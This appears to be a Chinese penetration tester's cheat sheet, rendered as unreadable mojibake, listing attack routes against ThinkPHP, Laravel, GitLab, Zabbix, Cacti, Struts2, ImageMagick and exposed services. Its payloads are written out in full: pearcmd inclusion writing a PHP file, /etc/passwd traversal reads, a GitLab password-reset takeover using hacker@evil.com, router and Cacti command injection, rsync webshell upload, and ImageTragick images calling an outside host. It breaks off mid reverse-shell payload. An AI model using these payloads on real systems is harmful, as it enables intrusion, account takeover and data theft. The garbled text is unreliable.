SQLæ³¨å…¥æ¼æ´ (butian.net) è½¬è½½ï¼šSpringBladeæ¡†æ¶JWTè®¤è¯ç¼ºé™·æ¼æ´CVE-2021-44910 - æ˜é‡‘ (juejin.cn) ThinkPHP ä»£ç å®¡è®¡ä¹‹tpå„ç‰ˆæœ¬é“¾å­è°ƒå¼éšç¬” - å…ˆçŸ¥ç¤¾åŒº http://xz.aliyun.com/t/14038?time__1311=eqIxBDyD07G%3DYiKitD%2FWn2b8QiqqAKD8YeD#toc-28 debugæ¨¡å¼ä¸‹ æ•æ„Ÿå˜é‡æ³„æ¼ï¼šæ¯”å¦‚æ•°æ®åº“çš„è´¦å¯† æ—¥å¿—æ³„æ¼ï¼ˆè¿™ä¸ªæ„Ÿè§‰æ¯”è¾ƒå¤šï¼‰ # é»˜è®¤æ—¥å¿—åä¸ºyear_month_day.log /Application/Runtime/Logs/app_name/æ—¥å¿—å /Runtime/Logs/app_name/æ—¥å¿—å # å…¶ä»–ç¢°è§è¿‡çš„æ—¥å¿—å day.log /year/month/day.log æ‰¾ç™»å½•æ—¥å¿—è¿›åå° è§‚å¯Ÿsqlè¯­å¥è¿›è¡ŒSQLæ³¨å…¥ cacheæ–‡ä»¶getshell ç¼“å­˜æ–‡ä»¶ï¼šç½‘ç«™ä¸ºäº†å®ç°åŠ é€Ÿè®¿é—®ï¼Œä¼šå°†ç”¨æˆ·è®¿é—®è¿‡çš„é¡µé¢å­˜å…¥ç¼“å­˜æ¥å‡å°æ•°æ®åº“æŸ¥è¯¢çš„å¼€é”€ å¯èƒ½éœ€è¦é€šè¿‡æ—¥å¿—æ‰¾åˆ°cacheæ–‡ä»¶çš„å‘½åæ–¹å¼ é»˜è®¤æƒ…å†µä¸‹ # æ¼æ´å½¢æˆç‚¹ Cache::set(\"name\",$value,3600); # set(ç¼“å­˜æ ‡è¯†ï¼Œç¼“å­˜å€¼ï¼Œç¼“å­˜ä¿ç•™æ—¶é—´) $data = \"\"; # payload $data=\"%0a%0dphpinfo();//\" # ç”Ÿæˆçš„ç¼“å­˜æ–‡ä»¶ä½ç½® /runtime/cache/MD5(name)å‰ä¸¤ä½/MD5(name)å30ä½.php æ–‡ä»¶è¯»å– ?s=index/\\think\\Lang/load&file=/etc/passwd ååºåˆ—åŒ– Thinkphp5 RCEæ€»ç»“ - Y4erçš„åšå®¢ https://y4er.com/posts/thinkphp5-rce/#5010 å…³é”®æ˜¯æ‰¾å¥½è·¯ç”±ï¼Œé»˜è®¤æ˜¯ä»¥./public/index.phpä½œä¸ºå…¥å£æ–‡ä»¶ï¼Œä½†æ˜¯å¾ˆå¤šéƒ½æ˜¯äºŒå¼€ï¼Œå…¥å£æ–‡ä»¶ä¸ä¸€æ · ThinkPHP å‰ææ¡ä»¶ï¼š PHPç¯å¢ƒå¼€å¯äº†register_argc_argv PHPç¯å¢ƒå®‰è£…äº†pcel/pear payload ?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/+/var/www/html/a.php è®°å¾—åœ¨burpä¸­å‘é€ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šå°† ç›¸å…³æ–‡ç«  ä¸€æ¬¡å®æˆ˜ä¸­å¯¹tp5ç½‘ç«™getshellæ–¹å¼çš„æµ‹è¯• - å…ˆçŸ¥ç¤¾åŒº https://xz.aliyun.com/t/10397?u_atoken=bd39fa3f-27e6-48c8-8b24-0914f7d52cea&u_asession=0107aUPLH02VyMq5l2bQ1rJqxO9w09bZdhtwpo-LcXEMlexgaezyHFq8YP73UBF0dHxb7w_ePXHSZCYxDkbgVwRtsq8AL43dpOnCClYrgFm6o&u_asig=05TLfL3h27z5sjRpO60Xhk4KJy4jzYas6TL5hoa3TC-XZZ7_Qqh-xR721_HDl1HXsWX6duFq3DEUnpjEdBOtUxCt_3Ro2HyeedXcyLFtm4EAFaXTgQSh0_yThH-4s10MXVrLloBgFgEDzkpHBSzONvZW_dqCVdL-mrGHvozk4u6EzaKUxtB9OnxETkEKIRw6I4ksmHjM0JOodanL5-M1Qs1RNYVI7Zx8cse5jmZICjbJo1odU9NAP3CLNgLKXD3WsYJ9teUCXjKpGfDlN67LYSUPcOlfkLn0Wijfp9ix1RLDLUpLHxH1iRKZmnjAu0Zefw&u_aref=PM9yMaut3%2FM9WTgVfiEQMWW6YX0%3D å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-Thinkphp5-rce-è¿‡å®å¡”å°æ€è·¯ https://forum.butian.net/index.php/share/1121 ThinkphpäºŒå¼€æ¡†æ¶ hisiphp ä» hisiphp ä¸­ getshell - ç«çº¿ Zone-å®‰å…¨æ”»é˜²ç¤¾åŒº https://zone.huoxian.cn/d/2726-hisiphp-getshell Hisiphpä»£ç å®¡è®¡åå°getshell_hisiphp æ¼æ´-CSDNåšå®¢ https://blog.csdn.net/qq_18193739/article/details/132765176 csrf and xss Vulnerability Â· Issue #3 Â· hisiphp/hisiphp https://github.com/hisiphp/hisiphp/issues/3 ThinkAdmin https://www.t00ls.com/viewthread.php?tid=68505&highlight=thinkadmin FastAdmins admin.php/index/login æ¡†æ¶ç‰¹å¾ æ¡†æ¶äº†è§£ FastAdminåœ¨çº¿æ¼”ç¤º,FastAdminæ’ä»¶æ¼”ç¤º â€“ åŸºäºThinkPHPå’ŒBootstrapçš„æé€Ÿåå°å¼€å‘æ¡†æ¶ https://www.fastadmin.net/demo.html æ¸—é€å§¿åŠ¿ ThinkPHP 5æ—¥å¿—æ–‡ä»¶åŒ…å«trick - æ°´æ³¡æ³¡ - åšå®¢å›­ https://www.cnblogs.com/r00tuser/p/14344922.html Fastadmin æ¼æ´åˆé›† | Caps ä»»æ„æ–‡ä»¶è¯»å– /index/ajax/lang?lang=../../application/database Laravel index.php æŠ¥é”™ä¿¡æ¯ debugæ¨¡å¼ä¸‹ä¿¡æ¯æ³„æ¼ ä½¿ç”¨ä¸å…è®¸çš„è¯·æ±‚æ–¹æ³• æˆ–è€…ç›®å½•æ‰«æï¼Ÿï¼Ÿï¼Ÿ .env vendor/.env lib/.env lab/.env cronlab/.env cron/.env core/.env core/app/.env core/Database/.env database/.env config/.env assets/.env app/.env apps/.env uploads/.env sitemaps/.env site/.env admin/.env web/.env public/.env en/.env tools/.env v1/.env administrator/.env laravel/.env ä»»æ„ç”¨æˆ·ç™»å½• content-type:application/json {\"username\":[0,0],\"password\":\"1\"} NDay Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰åˆ†æå¤ç° - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) CVE-2018-15133 Laravel framework 5.5.x éœ€è¦çŸ¥é“app_keyï¼ˆdebugæ¨¡å¼ä¸‹çš„base64å­—ç¬¦ä¸²ï¼‰ aljavier/exploit_laravel_cve-2018-15133: Exploit for Laravel Remote Code Execution with API_KEY (CVE-2018-15133) (github.com) python pwn_laravel.py url App_key -c command æˆ–è€…-iè¿›å…¥äº¤äº’æ¨¡å¼ é‡åˆ°çš„é—®é¢˜ çˆ†ç ´åå°æ—¶ï¼ŒçŠ¶æ€ç å…¨ä¸º419 Laravelä¸ºäº†é˜²æ­¢è·¨åŸŸæ”»å‡»ä¼šæœ‰ä¸€ä¸ªCSRF-TOKENï¼Œå¦‚æœTokenè¿‡æœŸäº†ï¼Œå‘èµ·çš„è¯·æ±‚å°±ä¼šéƒ½æ˜¯419çŠ¶æ€ç ï¼Œéœ€è¦é‡æ–°è·å–CSRF-TOKEN xssåˆ·æ´ /_ignition/scripts/--> GitLab nmapç‰ˆæœ¬åˆ¤æ–­ https://github.com/righel/gitlab-version-nse/ ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶--CVE-2023-2825--å®é™…åˆ©ç”¨æ„Ÿè§‰æŒºéš¾çš„ å‰ææ¡ä»¶ï¼š gitlab-ee/ce == 16.0.0 å­˜åœ¨å¯ä»¥è¾¾åˆ°æ ¹â½¬å½•çš„åµŒå¥—å¯å…¬å¼€è®¿é—®åˆ°çš„groupé¡¹â½¬â½½ä¸”å­˜åœ¨é™„ä»¶(issus è¯„è®ºç­‰) æˆ–æ™®é€šâ½¤æˆ·æƒé™â¼¿åŠ¨åˆ›å»ºå¤šå±‚groupå’Œé¡¹â½¬ payload # 123ä¸ºissueæ ‡é¢˜ï¼Œuploads/dde0c86647fa452e76b94c9588d7fcbbä¸ºé™„ä»¶æ‰€åœ¨ç›®å½• http://your-ip/group1/group2/group3/group4/group5/group6/group7/group8/group9/123/uploads/dde0c86647fa452e76b94c9588d7fcbb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd SSRF CVE-2021-22214 GITLAB SSRF æœªæˆæƒæ¼æ´-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° RCE gitlabæœªæˆæƒRCEï¼ˆCVE-2021-22205ï¼‰æ¼æ´å¤ç°åŠæ·±å…¥åˆ©ç”¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° ä¿¡æ¯æ³„æ¼ï¼ˆé¸¡è‚‹ï¼‰ POST /api/graphql # ç”¨æˆ·å {\"query\":\"{users{edges{node{username,email}}}}\"} # ç”¨æˆ·åï¼Œé‚®ç®±ï¼Œå¤´åƒä¿¡æ¯ {\"query\":\"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\",\"variables\":null,\"operationName\":null} ä»»æ„ç”¨æˆ·æ¥ç®¡æ¼æ´--CVE-2023-7028 GitLabåœ¨é‡ç½®å¯†ç æ—¶ï¼Œå¯ä»¥ä¼ å…¥æ•°ç»„ä½œä¸ºemailï¼Œæ”»å‡»è€…å°†è‡ªå·±çš„é‚®ç®±åŠ å…¥æ•°ç»„ä¸­ï¼Œå¯ä»¥è®©GitLabåœ¨é‡ç½®å¯†ç æ—¶å°†é‚®ä»¶å‘ç»™æ•°ç»„é‡Œçš„æ‰€æœ‰ç”¨æˆ·ã€‚ user[email][]=my.target@example.com&user[email][]=hacker@evil.com Gitblit ä»£ç ä»“åº“å¯ä»¥ç›´æ¥git cloneã€‚ã€‚ã€‚ Gitblit 1.9.3 ç›®å½•éå† /resources//../WEB-INF/web.xml è‹¥ä¾ è‹¥ä¾æ¼æ´ | Khaz (fgtbnc.github.io) é‡åˆ°çš„é—®é¢˜ ç”¨æˆ·å‡­è¯ï¼ˆå·¥å…·æ˜¯cookieï¼Œä½†æ˜¯é‡åˆ°çš„å¾ˆå¤šéƒ½æ˜¯JWTçš„ï¼‰ å®šæ—¶ä»»åŠ¡å¤„çš„è¿‡æ»¤ Phpstudy æŒ‡çº¹ responseçš„Serverï¼šServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 é›†æˆç¯å¢ƒ nginxè§£ææ¼æ´ phpmyadminç›®å½• ã€æ¼æ´å¤ç°ã€‘phpStudy å°çš® Windowsé¢æ¿ RCEæ¼æ´phpstudy æ¼æ´æç«ç«å®‰å…¨é˜çš„åšå®¢-CSDNåšå®¢ shiro shiroæ¼æ´ | Khaz (fgtbnc.github.io) æµ·åº·å¨è§† ã€æ¼æ´æ€»ç»“ã€‘æµ·åº·å¨è§†å…«å¤§æ¼æ´æ±‡æ€» https://mp.weixin.qq.com/s/khra2Z6U57kktxGooUEu-A æµ·åº·å¨è§†IP Camera Isecure Centerç»¼åˆå®‰é˜²ç®¡ç†å¹³å°ä»»æ„æ–‡ä»¶ä¸Šä¼  iVMS-5000,iVMS-8700ä»»æ„æ–‡ä»¶ä¸Šä¼  Jenkins https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Struct2 OGNLè¡¨è¾¾å¼æ³¨å…¥ # å…³é”®å‡½æ•° Ognl.getValue() æµ‹è¯•OGNLè¡¨è¾¾å¼${233*233}ï¼Œå¦‚æœé¡µé¢å›æ˜¾233*233çš„ç»“æœï¼Œåˆ™å­˜åœ¨OGNLè¡¨è¾¾å¼è§£æã€‚ æ¼æ´åç§° æ³¨å…¥ç‚¹ å½±å“ç‰ˆæœ¬ S2-061 2.0.0 - 2.5.25 S2-045 Content-Type 2.3.5 - 2.3.31ï¼Œ 2.5 - 2.5.10 S2-046 æ–‡ä»¶ä¸Šä¼ çš„filenameå€¼ä½ç½®ï¼Œå¹¶éœ€è¦ä½¿ç”¨\\x00æˆªæ–­ 2.3.5 - 2.3.31ï¼Œ 2.5 - 2.5.10 S2-005 S2-008 S2-009 S2-013 S2-016(å®é™…ä¸Š,å¾ˆå¤šéƒ½è€ç³»ç»Ÿéƒ½æ¼è¡¥äº†è¿™ä¸ªæ´,æˆåŠŸç‡è¾ƒé«˜) S2-019 S2-020 S2-devmode S2-032 S2-033 S2-037 S2-045 S2-046 S2-048 S2-052 S2-053 S2-057 JBOSS JBossæ˜¯ä¸€ä¸ªåŸºäºJ2EEçš„å¼€å‘æºä»£ç çš„åº”ç”¨æœåŠ¡å™¨ã€‚JBossä»£ç éµå¾ªLGPLè®¸å¯ï¼Œå¯ä»¥åœ¨ä»»ä½•å•†ä¸šåº”ç”¨ä¸­å…è´¹ä½¿ç”¨ã€‚JBossæ˜¯ä¸€ä¸ªç®¡ç†EJBçš„å®¹å™¨å’ŒæœåŠ¡å™¨ï¼Œæ”¯æŒEJB1.1ã€EJB2.0å’ŒEJB3çš„è§„èŒƒã€‚ä½†JBossæ ¸å¿ƒæœåŠ¡ä¸åŒ…æ‹¬æ”¯æŒservlet/JSPçš„WEBå®¹å™¨ï¼Œä¸€èˆ¬ä¸Tomcatæˆ– Jettyç»‘å®šä½¿ç”¨ã€‚ å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-Jbossæ¸—é€åˆé›† typecho åå°è·¯å¾„https://www.03sec.com/Reprinted/typechoxiu-gai-hou-tai-lu-jing-liu-xia-de-lou-dong.html åå°ä¿®æ”¹æ–‡ç« phpæ–‡ä»¶ç›´æ¥getshell Typechoååºåˆ—åŒ–æ¼æ´åˆ†æ https://xz.aliyun.com/t/9428 ç«¯å£æ¸—é€ åè®®ç±» FTP-20/21 ä»‹ç» åº”ç”¨å±‚åè®®ï¼Œç”¨äºæ–‡ä»¶ä¼ è¾“ ç«¯å£21 ç”¨äºFTPçš„æ§åˆ¶è¿æ¥ï¼Œç”¨äºå»ºç«‹å’Œç»´æŠ¤FTPä¼šè¯ã€‚å®¢æˆ·ç«¯é€šè¿‡è¯¥ç«¯å£ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œå‘é€å‘½ä»¤å’Œæ¥æ”¶å“åº”ã€‚ ç«¯å£20 ç”¨äºFTPçš„æ•°æ®è¿æ¥ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚ä¾‹å¦‚ï¼Œå½“éœ€è¦ä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œæ•°æ®å°†é€šè¿‡ç«¯å£20è¿›è¡Œä¼ è¾“ã€‚ å­˜åœ¨çš„é£é™© anonymousåŒ¿åè®¿é—®ï¼Œå¼±å£ä»¤ï¼Œä»è€Œå¯ä»¥ä»»æ„è®¿é—®æ–‡ä»¶ SSH-22 ä»‹ç» ç”¨äºè¿æ¥è¿œç¨‹æœåŠ¡å™¨ï¼Œä½¿ç”¨å…¬é’¥ç®—æ³•è¿›è¡Œé€šä¿¡ å­˜åœ¨çš„é£é™© ä¸Šä¼ å…¬é’¥getshell å¼±å£ä»¤getshell sshåé—¨æƒé™ç»´æŒ Telent-23 ä»‹ç» è·Ÿsshä½œç”¨ç›¸åŒï¼Œä½†æ˜¯æ˜¯æ˜æ–‡é€šä¿¡å¾ˆä¸å®‰å…¨ï¼Œå·²è¢«sshä»£æ›¿ å­˜åœ¨çš„é£é™© ç½‘ç»œå—…æ¢ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ åˆ¤æ–­TCPåè®®æ˜¯å¦å‡ºç½‘ SMTP/SMTPS-25/465 ä»‹ç» åº”ç”¨å±‚åè®®ï¼Œç”¨äºé‚®ä»¶çš„å‘é€ å­˜åœ¨çš„é£é™© æœªæˆæƒè®¿é—®/å¼±å£ä»¤ï¼Œä»è€Œå¯ä»¥å‘é€é’“é±¼é‚®ä»¶ DNS-53 ä»‹ç» åº”ç”¨å±‚åè®®ï¼Œç”¨äºå°†åŸŸåè§£æä¸ºIPåœ°å€æˆ–è€…è¿›è¡Œåå‘è§£æã€‚ å­˜åœ¨çš„é£é™© DNSæ¬ºéª— DNSç¼“å­˜æŠ•æ¯’ æ‹’ç»æœåŠ¡æ”»å‡» åŸŸä¼ é€ POP3-110 ä»‹ç» åº”ç”¨å±‚åè®®ï¼Œç”¨äºä»é‚®ä»¶æœåŠ¡å™¨ä¸Šä¸‹è½½ç”µå­é‚®ä»¶åˆ°æœ¬åœ°å®¢æˆ·ç«¯ã€‚ å­˜åœ¨çš„é£é™© æ˜æ–‡ä¼ è¾“ é‚®ä»¶åŠ«æŒ IMAP-143 ä»‹ç» åº”ç”¨å±‚åè®®ï¼Œå…è®¸ç”¨æˆ·åœ¨é‚®ä»¶æœåŠ¡å™¨ä¸Šç®¡ç†å’Œæ£€ç´¢ç”µå­é‚®ä»¶ã€‚ å­˜åœ¨çš„é£é™© åŒPOP3 Rsync-893 ä»‹ç» Rsyncæ˜¯Linuxä¸‹çš„ä¸€æ¬¾æ•°æ®å¤‡ä»½å·¥å…·ï¼Œæ”¯æŒé€šè¿‡rsyncåè®®ã€sshåè®®è¿›è¡Œè¿œç¨‹æ–‡ä»¶ä¼ è¾“ï¼ˆä½†ä¸æ”¯æŒä¸¤å°è¿œç¨‹è®¡ç®—æœºä¹‹é—´çš„åŒæ­¥ï¼‰ã€‚å¸¸è¢«ç”¨äºåœ¨å†…ç½‘è¿›è¡Œæºä»£ç çš„åˆ†å‘åŠåŒæ­¥æ›´æ–°ï¼Œå› æ­¤ä½¿ç”¨äººç¾¤å¤šä¸ºå¼€å‘äººå‘˜ã€‚ å­˜åœ¨çš„é£é™© å…¶ä¸­rsyncåè®®é»˜è®¤ç›‘å¬873ç«¯å£ï¼Œè€Œä¸€èˆ¬å¼€å‘äººå‘˜å®‰å…¨æ„è¯†è–„å¼±çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç›®æ ‡å¼€å¯äº†rsyncæœåŠ¡ï¼Œå¹¶ä¸”æ²¡æœ‰é…ç½®ACLæˆ–è®¿é—®å¯†ç ï¼Œæˆ‘ä»¬å°†å¯ä»¥è¯»å†™ç›®æ ‡æœåŠ¡å™¨æ–‡ä»¶ã€‚ æŸ¥çœ‹ rsync å®ˆæŠ¤ç¨‹åºåˆ†é…çš„æ‰€æœ‰ module åˆ—è¡¨ rsync rsync://IP:873 ä¸‹è½½æ–‡ä»¶æˆ–ç›®å½•åˆ°æœ¬åœ° rsync -avz ip://xxx/secret /root/secret ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨ rsync -avz webshell.php ip://web/ ä¿®å¤ rsyncé»˜è®¤çš„é…ç½®æ–‡ä»¶/etc/rsyncd.conf motd file -> motdæ–‡ä»¶ä½ç½® log file -> æ—¥å¿—æ–‡ä»¶ä½ç½® path -> é»˜è®¤è·¯å¾„ä½ç½® use chroot -> æ˜¯å¦é™å®šåœ¨è¯¥ç›®å½•ä¸‹ï¼Œé»˜è®¤ä¸ºtrueï¼Œå½“æœ‰è½¯è¿æ¥æ—¶ï¼Œéœ€è¦æ”¹ä¸ºfasle,å¦‚æœä¸ºtrueå°±é™å®šä¸ºæ¨¡å—é»˜è®¤ç›®å½• read only -> åªè¯»é…ç½®ï¼ˆyes or noï¼‰ list=true -> æ˜¯å¦å¯ä»¥åˆ—å‡ºæ¨¡å—å uid = root -> ä¼ è¾“ä½¿ç”¨çš„ç”¨æˆ·å gid = root -> ä¼ è¾“ä½¿ç”¨çš„ç”¨æˆ·ç»„ auth users -> è®¤è¯ç”¨æˆ·å secrets file=/etc/rsyncd.passwd -> æŒ‡å®šå¯†ç æ–‡ä»¶ï¼Œå¦‚æœè®¾å®šéªŒè¯ç”¨æˆ·ï¼Œè¿™ä¸€é¡¹å¿…é¡»è®¾ç½®ï¼Œè®¾å®šå¯†ç æƒé™ä¸º400,å¯†ç æ–‡ä»¶/etc/rsyncd.passwdçš„å†…å®¹æ ¼å¼ä¸ºï¼šusername:password hosts allow=192.168.0.101 -> è®¾ç½®å¯ä»¥å…è®¸è®¿é—®çš„ä¸»æœºï¼Œå¯ä»¥æ˜¯ç½‘æ®µï¼Œå¤šä¸ªIpåœ°å€ç”¨ç©ºæ ¼éš”å¼€ hosts deny ç¦æ­¢çš„ä¸»æœºï¼Œhostçš„ä¸¤é¡¹å¯ä»¥ä½¿ç”¨*è¡¨ä»»æ„ã€‚ SMB-445/139 SMBï¼ˆServer Message Blockï¼‰æœåŠ¡æ˜¯ä¸€ç§ç½‘ç»œæ–‡ä»¶å…±äº«åè®®ï¼Œä¸»è¦ç”¨äºå±€åŸŸç½‘å†…çš„æ–‡ä»¶å…±äº«ã€æ‰“å°æœºå…±äº«å’Œå…¶ä»–ç½‘ç»œèµ„æºçš„è®¿é—®ã€‚SMBåè®®å¹¿æ³›ç”¨äºWindowsæ“ä½œç³»ç»Ÿï¼Œä½†ç°åœ¨ä¹Ÿæ”¯æŒLinuxå’ŒmacOSã€‚ åŸºæœ¬æ“ä½œ smbclient -L Host -N // åŒ¿åè®¿é—® smbclient //192.168.1.100/shared -U username // æŒ‡å®šç”¨æˆ·ç™»å½• smbclient //192.168.1.100/shared -U DOMAIN/username // åŸŸè®¤è¯ç™»å½• // éäº¤äº’æ¨¡å¼ smbclient //192.168.1.100/shared -U username -c \"command\" // äº¤äº’æ¨¡å¼ ls // åˆ—æ–‡ä»¶ get \"filename\" //ä¸‹è½½æ–‡ä»¶ put localfile remotefile // ä¸Šä¼ æ–‡ä»¶ mkdir dirname // åˆ›å»ºç›®å½• del filename // åˆ é™¤æ–‡ä»¶ exit // é€€å‡º CVE-2020-0796 SMBGhost WinRM-5985/5986 WinRMï¼ˆWindowsè¿œç¨‹ç®¡ç†ï¼‰ æ˜¯ä¸€ç§Windowsæ“ä½œç³»ç»Ÿä¸­çš„åè®®å’ŒæœåŠ¡ï¼ŒåŸºäº WS-Managementï¼ˆWebæœåŠ¡ç®¡ç†åè®®ï¼‰ æ ‡å‡†ã€‚å®ƒç”¨äºé€šè¿‡HTTPæˆ–HTTPSè¿›è¡Œè¿œç¨‹ç®¡ç†å’Œç³»ç»Ÿé…ç½®ã€‚ æ•°æ®åº“ç±» MSSQL-1433 å…³ç³»å‹æ•°æ®åº“ Oracle-1521 Mysql-3306 PostgreSQL-5432 Reidis-6379 MongoDB-27017 éå…³ç³»å‹æ•°æ®åº“ å¼±å£ä»¤ æœªæˆæƒè®¿é—® NoSqlæ³¨å…¥ Access-æ— ç«¯å£å· Accessæ•°æ®åº“å±äºæ–‡ä»¶å‹æ•°æ®åº“ï¼Œæ‰€ä»¥ä¸éœ€è¦ç«¯å£å·ã€‚ åœ¨Office 2007ä¹‹å‰çš„Accessæ•°æ®åº“æ–‡ä»¶çš„åç¼€æ˜¯ .mdb ï¼ŒOffice2007åŠå…¶ä¹‹åçš„Accessæ•°æ®åº“æ–‡ä»¶çš„åç¼€æ˜¯ .accdb WebæœåŠ¡ç±» Weblogic-7001 JBOSS-8080 Jenkis-8080 Zabbix-10051 zabbixæ˜¯ä¸€æ¬¾æœåŠ¡å™¨ç›‘æ§è½¯ä»¶ï¼Œé»˜è®¤æœåŠ¡å¼€æ”¾ç«¯å£ä¸º10051ï¼Œå…¶ç”±serverã€agentã€webç­‰æ¨¡å—ç»„æˆï¼Œå…¶ä¸­webæ¨¡å—ç”±PHPç¼–å†™ï¼Œç”¨æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„ç»“æœã€‚ Zabbix æ”»å‡»é¢æŒ–æ˜ä¸åˆ©ç”¨ (seebug.org) æœªæˆæƒè®¿é—® /zabbix.php?action=problem.view&ddreset=1 /overview.php?ddreset=1 /srv_status.php?ddreset=1 /latest.php?ddreset=1 bylibrary/docs/æ¼æ´åº“/01-CMSæ¼æ´/zabbix at main Â· BaizeSec/bylibrary (github.com) sqlæ³¨å…¥ åå°åˆ›å»ºè„šæœ¬getshell CVE-2022-23131ï¼šZabbix SSOè®¤è¯ç»•è¿‡æ¼æ´ - SecPulse.COM | å®‰å…¨è„‰æ CVE-2020-11800 zabbix RCEæ¼æ´ç»†èŠ‚æŠ«éœ² - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) è¿›å…¥åå°å¯è‡ªåŠ¨æ³¨å†ŒåŠŸèƒ½ expè·å–serverç«¯ï¼ˆexpéœ€è¦åœ¨zabbixæ‰€åœ¨çš„æœåŠ¡å™¨ä¸Šè¿è¡Œï¼‰ python exp.py 127.0.0.1 cmd å®å¡”-8888 /pma Solr-8983 /solr/admin Apache Solr Docker-Remote-API-2375 Docker è¿œç¨‹ API æœªæˆæƒè®¿é—®é€ƒé€¸ | T Wiki (teamssix.com) Docker Registry-5000 RabbitMQ-15672ã€15692ã€25672 å¼±å£ä»¤guset/guest è¿œç¨‹æ¡Œé¢ RDP-3389 è®¾å¤‡ Vmware W01fh4cker/ScreenConnect-AuthBypass-RCE: ScreenConnect AuthBypass(cve-2024-1709) --> RCE!!! https://github.com/W01fh4cker/ScreenConnect-AuthBypass-RCE è·¯ç”±å™¨ é£æ˜Ÿé±¼è·¯ç”±å™¨ POST /send_order.cgi?parameter=operation HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded {\"opid\":\"1\",\"name\":\";id;\",\"type\":\"rest\"} cacti cactiæ˜¯ä¸€å¥—åŸºäºPHP,MySQL,SNMPåŠRRDToolå¼€å‘çš„ç½‘ç»œæµé‡ç›‘æµ‹å›¾å½¢åˆ†æå·¥å…· CVE-2022-46169 GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`ping%20e2y29y.dnslog.cn` X-Forwarded-For: 127.0.0.1 Unauthenticated SQL Injection when viewing graphs Â· Advisory Â· Cacti/cacti https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg CVE-2020-8813-Cacti-v1.2.8-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ - Cacti https://www.hacking8.com/bug-product/Cacti/CVE-2020-8813-Cacti-v1.2.8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html æ¼æ´é¢„è­¦ | Cactiæ–‡ä»¶åŒ…å«å’ŒSQLæ³¨å…¥æ¼æ´ | CN-SEC ä¸­æ–‡ç½‘ https://cn-sec.com/archives/2342658.html ç»„ä»¶ Imagetragick åŸç† ImageMagickæœ‰ä¸€ä¸ªåŠŸèƒ½å«åšdelegateï¼ˆå§”æ‰˜ï¼‰ï¼Œä½œç”¨æ˜¯è°ƒç”¨å¤–éƒ¨çš„libæ¥å¤„ç†æ–‡ä»¶ã€‚è€Œè°ƒç”¨å¤–éƒ¨libçš„è¿‡ç¨‹æ˜¯ä½¿ç”¨ç³»ç»Ÿçš„systemå‘½ä»¤æ¥æ‰§è¡Œï¼Œæ¼æ´å‘ç”Ÿçš„åœ°æ–¹ï¼š å®ƒåœ¨è§£æhttpså›¾ç‰‡çš„æ—¶å€™ï¼Œä½¿ç”¨äº†curlå‘½ä»¤å°†å…¶ä¸‹è½½ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸€äº›å ä½ç¬¦ï¼Œå¦‚%oæ˜¯curlè¾“å‡ºçš„æ–‡ä»¶åï¼Œ%Mæ˜¯è¿œç¨‹çš„URLè·¯å¾„ã€‚æ³¨æ„åˆ°commandä¸­çš„å¯ä»¥åˆ°%Mæ˜¯å¯ä»¥æ‹¼æ¥å…¶ä»–æŒ‡ä»¤å¹¶è¢«åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œçš„ã€‚è¯¥æ¼æ´ä¹Ÿå› æ­¤è€Œæ¥ï¼Œè¢«æ‹¼æ¥å®Œæ¯•çš„å‘½ä»¤è¡Œä¼ å…¥äº†ç³»ç»Ÿçš„systemå‡½æ•°ï¼Œè€Œæˆ‘ä»¬åªéœ€ä½¿ç”¨åå¼•å·ï¼ˆ`ï¼‰æˆ–é—­åˆåŒå¼•å·ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™æ ·ï¼š command=\" \"curl\" -s -k -o \"%o\" \"https:%M\" \"/> å½“%Mä¸ºï¼šhttps://\"|id && ls -al /etc/passwd\" command=\" \"curl\" -s -k -o \"%o\" \"https://\"|id && ls -al /etc/passwd\"\" \"/> payload ä¸Šä¼ çš„å›¾ç‰‡å†…å®¹ CVE-2016-3714--å‘½ä»¤æ‰§è¡Œ # httpè¯·æ±‚ push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.0/oops.jpg\"|curl \"www.leavesongs.com:8889)' pop graphic-context # åå¼¹shell push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.0/oops.jpg?`echo 